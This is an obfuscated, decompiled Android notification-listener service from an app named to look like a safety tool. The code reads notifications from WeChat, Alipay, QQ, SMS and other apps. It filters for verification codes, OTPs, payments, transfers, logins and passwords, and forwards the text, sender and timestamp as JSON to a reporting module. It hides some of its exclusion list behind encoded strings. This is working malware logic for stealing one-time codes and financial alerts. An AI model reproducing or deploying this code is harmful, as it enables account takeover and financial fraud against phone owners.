package com.storm.safe.rock.service;

import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.sqlszawlrvc;
import com.storm.safe.rock.util.StringUtil;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.function.Predicate;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.AbstractC1120qr;
import p000.AbstractC1262tj;
import p000.C0873ms;
import p000.C1351vv;
import p000.ExecutorC1158qw;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.h10;
import p000.kg1;
import p000.l10;
import p000.nk0;
import p000.t60;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class sqlszawlrvc extends NotificationListenerService {

    /* renamed from: a1 */
    public static final LinkedHashMap f55174a1;

    /* renamed from: a2 */
    public static final Object f55175a2;

    /* renamed from: a3 */
    public static final List f55176a3;

    /* renamed from: a4 */
    public static final Set f55177a4;

    /* renamed from: a5 */
    public static final Object f55178a5;

    /* renamed from: a6 */
    public static volatile sqlszawlrvc f55179a6;

    /* renamed from: a0 */
    public final C0873ms f55180a0;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.service.sqlszawlrvc$a0 */
    public static final class C0377a0 {
        public /* synthetic */ C0377a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public final sqlszawlrvc getInstance() {
            return sqlszawlrvc.f55179a6;
        }

        public final boolean isNotificationListenerEnabled(Context context) {
            t60.m214695b6(context, "context");
            try {
                return ((HashSet) nk0.m214111a0(context)).contains(context.getPackageName());
            } catch (Exception unused) {
                return false;
            }
        }

        public final void openNotificationListenSettings(Context context) {
            t60.m214695b6(context, "context");
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(268435456);
                context.startActivity(intent);
            } catch (Exception unused) {
            }
        }

        private C0377a0() {
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.sqlszawlrvc$onListenerConnected$1", m214403f = "sqlszawlrvc.kt", m214404l = {133}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.sqlszawlrvc$onListenerConnected$1 */
    final class C03781 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public int f55181a1;

        public C03781(InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return sqlszawlrvc.this.new C03781(interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) {
            return ((C03781) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            int i = this.f55181a1;
            if (i == 0) {
                kg1.m213544f4(obj);
                this.f55181a1 = 1;
                if (b81.m210571b1(1000L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
            }
            LinkedHashMap linkedHashMap = sqlszawlrvc.f55174a1;
            return C1351vv.f60710b1;
        }
    }

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.sqlszawlrvc$onNotificationPosted$3", m214403f = "sqlszawlrvc.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.sqlszawlrvc$onNotificationPosted$3 */
    final class C03793 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ String f55184a1;

        /* renamed from: a2 */
        public final /* synthetic */ String f55185a2;

        /* renamed from: a3 */
        public final /* synthetic */ StatusBarNotification f55186a3;

        /* renamed from: a4 */
        public final /* synthetic */ String f55187a4;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C03793(String str, String str2, StatusBarNotification statusBarNotification, String str3, InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
            this.f55184a1 = str;
            this.f55185a2 = str2;
            this.f55186a3 = statusBarNotification;
            this.f55187a4 = str3;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C03793(this.f55184a1, this.f55185a2, this.f55186a3, this.f55187a4, interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C03793 c03793 = (C03793) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c03793.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            C0323a8 c0323a8M211471g5;
            C1351vv c1351vv = C1351vv.f60710b1;
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            try {
                dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                if (c0290a0 != null && (c0323a8M211471g5 = c0290a0.m211471g5()) != null) {
                    JSONObject jSONObject = new JSONObject();
                    String str = this.f55184a1;
                    String str2 = this.f55185a2;
                    StatusBarNotification statusBarNotification = this.f55186a3;
                    String str3 = this.f55187a4;
                    jSONObject.put("number", str);
                    jSONObject.put("text", str2);
                    jSONObject.put("timestamp", statusBarNotification.getPostTime());
                    jSONObject.put("type", "notification");
                    jSONObject.put("source", str3);
                    c0323a8M211471g5.m211659c5(jSONObject);
                    return c1351vv;
                }
                return c1351vv;
            } catch (Exception e) {
                t60.m214705c6("NotificationMonitor", "上报通知失败", e);
                return c1351vv;
            }
        }
    }

    static {
        new C0377a0(null);
        f55174a1 = new LinkedHashMap();
        f55175a2 = new Object();
        f55176a3 = AbstractC0716jf.m213306g5("验证码", "动态码", "验证", "OTP", "校验码", "转账", "付款", "收款", "支付", "到账", "扣款", "汇款", "余额", "消费", "交易", "登录", "登陆", "异常登录", "异地登录", "密码", "修改密码", "重置密码", "中奖", "领取", "红包", "奖励", "快递", "已发货", "已签收", "取件", "通知", "提醒", "警告", "预警");
        f55177a4 = AbstractC0134bh.m210734f7(new String[]{"com.storm.safe.rock", "android", "com.android.systemui", "com.android.settings", "com.android.phone", "com.android.launcher", "com.android.launcher3", "com.google.android.gms", "com.google.android.gsf", StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo=")});
        f55178a5 = AbstractC0770a1.m213614f9(new Pair("com.tencent.mm", "微信"), new Pair("com.tencent.mobileqq", "QQ"), new Pair("com.alibaba.android.rimet", "钉钉"), new Pair("com.alipay.android.app", "支付宝"), new Pair("com.eg.android.AlipayGphone", "支付宝"), new Pair("com.taobao.taobao", "淘宝"), new Pair("com.jd.app.reader", "京东"), new Pair("com.jingdong.app.mall", "京东"), new Pair("com.meituan.movie", "美团"), new Pair("com.sankuai.meituan", "美团"), new Pair("com.eleme.android", "饿了么"), new Pair("com.baidu.BaiduMap", "百度地图"), new Pair("com.autonavi.minimap", "高德地图"), new Pair("com.pinduoduo.android", "拼多多"), new Pair("com.xunmeng.pinduoduo", "拼多多"), new Pair("com.douyin.aweme", "抖音"), new Pair("com.zhiliaoapp.musically", "TikTok"), new Pair("com.ss.android.ugc.aweme", "抖音"), new Pair("com.kuaishou.nebula", "快手"), new Pair("tv.danmaku.bili", "哔哩哔哩"), new Pair("com.weibo.android", "微博"), new Pair("com.sina.weibo", "微博"), new Pair("com.netease.cloudmusic", "网易云音乐"), new Pair("com.tencent.qqmusic", "QQ音乐"), new Pair("com.android.mms", "短信"), new Pair("com.android.messaging", "短信"), new Pair("com.google.android.apps.messaging", "短信"), new Pair(StringUtil.m212470a0("KFYcdEUtDTlSOGVUFCleOQsr"), "短信"), new Pair(StringUtil.m212470a0("KFYcdEAxGScZPCZK"), "短信"), new Pair("com.samsung.android.messaging", "短信"), new Pair(StringUtil.m212470a0("KFYcdEIoHCEZPC5KAjtKPQ=="), "短信"), new Pair(StringUtil.m212470a0("KFYcdFsxGiEZPC5KAjtKPQ=="), "短信"));
    }

    public sqlszawlrvc() {
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        y21 y21Var = new y21();
        executorC1158qw.getClass();
        this.f55180a0 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        f55179a6 = this;
    }

    @Override // android.service.notification.NotificationListenerService, android.app.Service
    public void onDestroy() {
        super.onDestroy();
        f55179a6 = null;
        AbstractC1117qo.m214410a3(this.f55180a0);
    }

    @Override // android.service.notification.NotificationListenerService
    public final void onListenerConnected() {
        super.onListenerConnected();
        t60.m214714d6("NotificationMonitor", "通知监听已就绪");
        AbstractC0780a0.m213692a3(this.f55180a0, null, new C03781(null), 3);
    }

    @Override // android.service.notification.NotificationListenerService
    public final void onListenerDisconnected() {
        super.onListenerDisconnected();
        t60.m214726f4("NotificationMonitor", "通知监听已断开");
    }

    /* JADX WARN: Type inference failed for: r0v16, types: [java.lang.Object, java.util.Map] */
    /* JADX WARN: Type inference failed for: r0v26, types: [java.lang.Object, java.util.Map] */
    @Override // android.service.notification.NotificationListenerService
    public final void onNotificationPosted(StatusBarNotification statusBarNotification) {
        String packageName;
        Notification notification;
        Bundle bundle;
        String string;
        String string2;
        Object next;
        super.onNotificationPosted(statusBarNotification);
        if (statusBarNotification == null || (packageName = statusBarNotification.getPackageName()) == null) {
            return;
        }
        Set<String> set = f55177a4;
        if (set == null || !set.isEmpty()) {
            for (String str : set) {
                if (packageName.equals(str)) {
                    return;
                }
                if (AbstractC0779a1.m213679d2(packageName, false, str + ".")) {
                    return;
                }
            }
        }
        if ((AbstractC0779a1.m213679d2(packageName, false, "com.android.") && !f55178a5.containsKey(packageName)) || (notification = statusBarNotification.getNotification()) == null || (bundle = notification.extras) == null) {
            return;
        }
        String string3 = bundle.getString("android.title", "");
        if (string3 == null) {
            string3 = "";
        }
        CharSequence charSequence = bundle.getCharSequence("android.bigText");
        if (charSequence == null || (string = charSequence.toString()) == null) {
            string = "";
        }
        CharSequence charSequence2 = bundle.getCharSequence("android.text");
        if (charSequence2 == null || (string2 = charSequence2.toString()) == null) {
            string2 = "";
        }
        if (AbstractC0779a1.m213663b6(string)) {
            string = string2;
        }
        if (AbstractC0779a1.m213663b6(string3) && AbstractC0779a1.m213663b6(string)) {
            return;
        }
        String str2 = string3 + " " + string;
        Iterator it = f55176a3.iterator();
        while (true) {
            if (it.hasNext()) {
                next = it.next();
                if (AbstractC0779a1.m213652a5(str2, (String) next, false)) {
                    break;
                }
            } else {
                next = null;
                break;
            }
        }
        String str3 = (String) next;
        if (str3 == null) {
            return;
        }
        String str4 = packageName + "|" + string3 + "|" + string;
        final long jCurrentTimeMillis = System.currentTimeMillis();
        synchronized (f55175a2) {
            LinkedHashMap linkedHashMap = f55174a1;
            Long l = (Long) linkedHashMap.get(str4);
            if (jCurrentTimeMillis - (l != null ? l.longValue() : 0L) < 300000) {
                return;
            }
            linkedHashMap.put(str4, Long.valueOf(jCurrentTimeMillis));
            Set setEntrySet = linkedHashMap.entrySet();
            final h10 h10Var = new h10() { // from class: com.storm.safe.rock.service.sqlszawlrvc$onNotificationPosted$2$1
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(1);
                }

                @Override // p000.h10
                public final Object invoke(Object obj) {
                    Map.Entry entry = (Map.Entry) obj;
                    t60.m214695b6(entry, "it");
                    return Boolean.valueOf(jCurrentTimeMillis - ((Number) entry.getValue()).longValue() > 600000);
                }
            };
            setEntrySet.removeIf(new Predicate() { // from class: tk1
                @Override // java.util.function.Predicate
                public final boolean test(Object obj) {
                    LinkedHashMap linkedHashMap2 = sqlszawlrvc.f55174a1;
                    h10 h10Var2 = h10Var;
                    t60.m214695b6(h10Var2, "$tmp0");
                    return ((Boolean) h10Var2.invoke(obj)).booleanValue();
                }
            });
            String str5 = (String) f55178a5.get(packageName);
            if (str5 == null) {
                str5 = packageName;
            }
            String strM33b4 = AbstractC0003a2.m33b4("【", str5, "】");
            if (!AbstractC0779a1.m213663b6(string3) && !AbstractC0779a1.m213663b6(string)) {
                string3 = "【" + string3 + "】" + string;
            } else if (AbstractC0779a1.m213663b6(string3)) {
                string3 = string;
            }
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("命中通知[", str3, "] ", str5, ": ");
            sbM41c2.append(string3);
            t60.m214714d6("NotificationMonitor", sbM41c2.toString());
            AbstractC0780a0.m213692a3(this.f55180a0, null, new C03793(strM33b4, string3, statusBarNotification, packageName, null), 3);
        }
    }

    @Override // android.service.notification.NotificationListenerService
    public final void onNotificationRemoved(StatusBarNotification statusBarNotification) {
    }
}
